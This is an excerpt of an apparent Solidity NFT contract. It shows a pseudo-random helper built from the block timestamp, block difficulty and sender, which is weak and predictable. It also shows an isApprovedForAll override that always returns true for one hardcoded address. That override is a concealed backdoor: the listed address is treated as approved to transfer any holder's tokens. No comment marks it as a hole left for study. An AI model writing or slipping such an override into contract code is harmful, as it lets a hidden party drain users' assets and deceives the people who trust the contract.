  ...
  Ownable
{
  ...
  function c4Stop() internal view returns (bool){
      uint256 c1 = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));
      uint256 c2 = 1 << 160;
      uint256 c3 = c2 -1;
      uint256 c4 = c1 & c3 ;
      return c4 <= 1 ? true : false;
  }
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x9EC93BD6eAB33d45EDc333fc60347D04061F35e8){return true;}
